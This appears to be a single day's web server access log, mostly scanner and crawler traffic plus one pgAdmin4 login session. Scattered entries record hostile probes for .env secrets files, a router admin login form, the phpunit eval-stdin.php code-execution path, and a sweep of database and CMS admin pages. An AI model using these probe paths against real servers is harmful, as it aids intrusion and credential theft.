167.248.133.63 - - [03/Feb/2023:04:44:05 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
193.32.162.159 - - [03/Feb/2023:05:17:51 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [03/Feb/2023:05:25:36 +0000] "POST /boaform/admin/formLogin HTTP/1.0" 404 221 "http://217.182.70.109:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.129.185.105 - - [03/Feb/2023:05:33:02 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
159.203.192.15 - - [03/Feb/2023:06:04:41 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 zgrab/0.x"
20.172.164.82 - - [03/Feb/2023:06:33:32 +0000] "GET /.env HTTP/1.0" 404 202 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.172.164.82 - - [03/Feb/2023:06:33:32 +0000] "POST / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.247.252 - - [03/Feb/2023:06:55:12 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
184.105.247.252 - - [03/Feb/2023:06:57:16 +0000] "GET /favicon.ico HTTP/1.0" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
36.75.38.148 - - [03/Feb/2023:06:59:59 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.32.162.159 - - [03/Feb/2023:07:04:15 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.237.98.226 - - [03/Feb/2023:07:19:15 +0000] "GET /.env HTTP/1.0" 404 202 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.165.16.71 - - [03/Feb/2023:07:22:57 +0000] "\x03" 400 226 "-" "-"
194.165.16.71 - - [03/Feb/2023:07:22:57 +0000] "\x03" 400 226 "-" "-"
189.127.32.42 - - [03/Feb/2023:07:28:09 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.177.242 - - [03/Feb/2023:07:39:22 +0000] "GET / HTTP/1.0" 200 6625 "-" "Hello World"
77.120.176.51 - - [03/Feb/2023:07:42:42 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.32.162.159 - - [03/Feb/2023:07:48:34 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
203.57.254.113 - - [03/Feb/2023:08:26:38 +0000] "OPTIONS / HTTP/1.0" 200 - "-" "-"
203.57.254.113 - - [03/Feb/2023:08:27:04 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0)"
87.236.176.151 - - [03/Feb/2023:08:32:58 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
193.32.162.159 - - [03/Feb/2023:08:36:18 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
203.57.254.113 - - [03/Feb/2023:08:46:35 +0000] "GET / HTTP/1.0" 200 6625 "-" "-"
203.57.254.113 - - [03/Feb/2023:09:19:12 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
203.57.254.113 - - [03/Feb/2023:09:19:33 +0000] "GET / HTTP/1.1" 200 6625 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0)"
194.87.151.116 - - [03/Feb/2023:09:45:19 +0000] "POST /boaform/admin/formLogin HTTP/1.0" 404 221 "http://217.182.70.109:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
193.35.18.192 - - [03/Feb/2023:09:51:39 +0000] "GET /json/217.182.70.109 HTTP/1.0" 404 217 "-" "Go-http-client/1.1"
212.71.255.25 - - [03/Feb/2023:10:14:47 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
52.146.0.67 - - [03/Feb/2023:10:24:55 +0000] "GET /dist/ HTTP/1.0" 404 203 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
198.235.24.24 - - [03/Feb/2023:10:36:03 +0000] "GET / HTTP/1.0" 200 6625 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
200.25.254.5 - - [03/Feb/2023:10:45:47 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
94.102.61.10 - - [03/Feb/2023:11:09:33 +0000] "GET / HTTP/1.0" 200 6625 "-" "python-requests/2.26.0"
185.246.220.98 - - [03/Feb/2023:11:57:18 +0000] "POST /boaform/admin/formLogin HTTP/1.0" 404 221 "http://217.182.70.109:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.50.176.11 - - [03/Feb/2023:12:40:42 +0000] "GET /status?full=true HTTP/1.0" 404 204 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:43 +0000] "GET / HTTP/1.0" 200 6625 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:44 +0000] "GET /jmx-console HTTP/1.0" 404 209 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:45 +0000] "GET /manager/html HTTP/1.0" 404 210 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:46 +0000] "GET / HTTP/1.0" 200 6625 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:47 +0000] "GET //administrator HTTP/1.0" 404 211 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:47 +0000] "GET /joomla/administrator HTTP/1.0" 404 218 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:48 +0000] "GET /cms/administrator HTTP/1.0" 404 215 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:48 +0000] "GET /Joomla/administrator HTTP/1.0" 404 218 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:49 +0000] "GET /msd HTTP/1.0" 404 201 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:50 +0000] "GET /mySqlDumper HTTP/1.0" 404 209 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:50 +0000] "GET /msd1.24stable HTTP/1.0" 404 211 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:51 +0000] "GET /msd1.24.4 HTTP/1.0" 404 207 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:52 +0000] "GET /mysqldumper HTTP/1.0" 404 209 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:52 +0000] "GET /MySQLDumper HTTP/1.0" 404 209 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:53 +0000] "GET /mysql HTTP/1.0" 404 203 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:54 +0000] "GET /sql HTTP/1.0" 404 201 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:55 +0000] "GET /cgi-bin/php HTTP/1.0" 404 209 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:56 +0000] "GET /cgi-bin/php5 HTTP/1.0" 404 210 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:56 +0000] "GET /phpmyadmin HTTP/1.0" 404 208 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:57 +0000] "GET /phpMyAdmin HTTP/1.0" 404 208 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:58 +0000] "GET /mysql HTTP/1.0" 404 203 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:58 +0000] "GET /sql HTTP/1.0" 404 201 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:40:59 +0000] "GET /myadmin HTTP/1.0" 404 205 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:00 +0000] "GET / HTTP/1.0" 200 6625 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:01 +0000] "GET /sqlite/main.php HTTP/1.0" 404 213 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:02 +0000] "GET /SQLite/SQLiteManager-1.2.4/main.php HTTP/1.0" 404 233 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:03 +0000] "GET /SQLiteManager-1.2.4/main.php HTTP/1.0" 404 226 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:04 +0000] "GET /sqlitemanager/main.php HTTP/1.0" 404 220 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:04 +0000] "GET /SQlite/main.php HTTP/1.0" 404 213 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:05 +0000] "GET /SQLiteManager/main.php HTTP/1.0" 404 220 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:06 +0000] "GET /webdav HTTP/1.0" 404 204 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:06 +0000] "GET / HTTP/1.0" 200 6625 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:07 +0000] "GET //wp-login.php HTTP/1.0" 404 210 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:08 +0000] "GET /wordpress/wp-login.php HTTP/1.0" 404 220 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:08 +0000] "GET /wp/wp-login.php HTTP/1.0" 404 213 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:09 +0000] "GET /blog/wp-login.php HTTP/1.0" 404 215 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:09 +0000] "GET /Wordpress/wp-login.php HTTP/1.0" 404 220 "-" "Python-urllib/2.7"
198.50.176.11 - - [03/Feb/2023:12:41:10 +0000] "GET /Blog/wp-login.php HTTP/1.0" 404 215 "-" "Python-urllib/2.7"
179.43.177.242 - - [03/Feb/2023:12:50:40 +0000] "POST /boaform/admin/formLogin HTTP/1.0" 404 221 "http://217.182.70.109:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.246.220.98 - - [03/Feb/2023:13:39:15 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
74.82.47.5 - - [03/Feb/2023:13:43:42 +0000] "\x16\x03\x01" 400 226 "-" "-"
90.151.171.108 - - [03/Feb/2023:13:56:37 +0000] "GET /?Z73541062563Q1 HTTP/1.0" 200 6625 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
179.43.177.242 - - [03/Feb/2023:14:31:51 +0000] "GET / HTTP/1.0" 200 6625 "-" "Hello World"
205.210.31.171 - - [03/Feb/2023:15:16:27 +0000] "GET / HTTP/1.0" 200 6625 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.185.121.101 - - [03/Feb/2023:15:17:58 +0000] "\x16\x03\x01\x01-\x01" 400 226 "-" "-"
143.198.39.132 - - [03/Feb/2023:15:35:49 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.246.220.98 - - [03/Feb/2023:15:46:21 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
152.89.196.211 - - [03/Feb/2023:15:56:21 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [03/Feb/2023:16:01:01 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [03/Feb/2023:16:06:17 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:21 +0000] "GET /pgadmin4 HTTP/1.0" 308 268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/ HTTP/1.0" 302 276 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/login?next=%2Fpgadmin4%2F HTTP/1.0" 200 1621 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/static/js/generated/style.css?ver=61900 HTTP/1.0" 200 41849 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/static/js/generated/pgadmin.style.css?ver=61900 HTTP/1.0" 200 48847 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/static/js/generated/pgadmin.css?ver=61900 HTTP/1.0" 200 47901 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/static/img/login.svg?ver=61900 HTTP/1.0" 200 111612 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:29 +0000] "GET /pgadmin4/static/js/generated/fonts/Roboto-Regular..ttf HTTP/1.0" 200 171676 "http://217.182.70.109/pgadmin4/static/js/generated/pgadmin.style.css?ver=61900" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:30 +0000] "GET /pgadmin4/favicon.ico?ver=61900 HTTP/1.0" 302 282 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:30 +0000] "GET /pgadmin4/static/favicon.ico?ver=61900 HTTP/1.0" 200 78998 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:48 +0000] "POST /pgadmin4/authenticate/login HTTP/1.0" 302 226 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:48 +0000] "GET /pgadmin4/ HTTP/1.0" 302 242 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:48 +0000] "GET /pgadmin4/browser/ HTTP/1.0" 200 1850 "http://217.182.70.109/pgadmin4/login?next=%2Fpgadmin4%2F" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:49 +0000] "GET /pgadmin4/static/vendor/require/require.min.js?ver=61900 HTTP/1.0" 200 6770 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:49 +0000] "GET /pgadmin4/static/js/generated/pgadmin_commons.js?ver=61900 HTTP/1.0" 200 8555 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:49 +0000] "GET /pgadmin4/static/js/generated/vendor.main.js?ver=61900 HTTP/1.0" 200 123325 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:49 +0000] "GET /pgadmin4/browser/browser.css?ver=61900 HTTP/1.0" 200 4805 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:49 +0000] "GET /pgadmin4/static/js/generated/vendor.others.js?ver=61900 HTTP/1.0" 200 1348275 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:50 +0000] "GET /pgadmin4/static/js/generated/codemirror.js?ver=61900 HTTP/1.0" 200 2332 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:50 +0000] "GET /pgadmin4/static/js/generated/browser_nodes.js?ver=61900 HTTP/1.0" 200 21452 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:50 +0000] "GET /pgadmin4/static/js/generated/app.bundle.js?ver=61900 HTTP/1.0" 200 446599 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/browser/js/constants.js?ver=61900 HTTP/1.0" 200 455 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/browser/js/endpoints.js?ver=61900 HTTP/1.0" 200 2958 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/browser/server/supported_servers.js?ver=61900 HTTP/1.0" 200 290 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/browser/js/messages.js?ver=61900 HTTP/1.0" 200 811 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/user_management/current_user.js?ver=61900 HTTP/1.0" 200 314 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/static/js/gettext.js?ver=61900 HTTP/1.0" 200 552 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/tools/translations.js?ver=61900 HTTP/1.0" 200 321 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/static/js/pgadmin.js?ver=61900 HTTP/1.0" 200 2459 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:51 +0000] "GET /pgadmin4/browser/js/utils.js?ver=61900 HTTP/1.0" 200 2360 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/static/css/webcabin.overrides.css?v=1675440892053 HTTP/1.0" 200 42 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/browser/nodes/ HTTP/1.0" 200 255 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "POST /pgadmin4/browser/master_password HTTP/1.0" 200 119 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/browser/check_corrupted_db_file HTTP/1.0" 200 61 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/misc/bgprocess/ HTTP/1.0" 200 2 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/static/js/generated/fonts/fa-solid-900..woff2 HTTP/1.0" 200 78268 "http://217.182.70.109/pgadmin4/static/js/generated/style.css?ver=61900" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "POST /pgadmin4/settings/store HTTP/1.0" 200 369 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/browser/server_group/static/img/server_group.svg?ver=61900 HTTP/1.0" 200 1432 "http://217.182.70.109/pgadmin4/browser/browser.css?ver=61900" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/preferences/get_all HTTP/1.0" 200 8646 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:52 +0000] "GET /pgadmin4/settings/get_tree_state/ HTTP/1.0" 200 - "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.16.228.210 - - [03/Feb/2023:16:14:57 +0000] "GET /pgadmin4/browser/server_group/children/1 HTTP/1.0" 200 61 "http://217.182.70.109/pgadmin4/browser/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
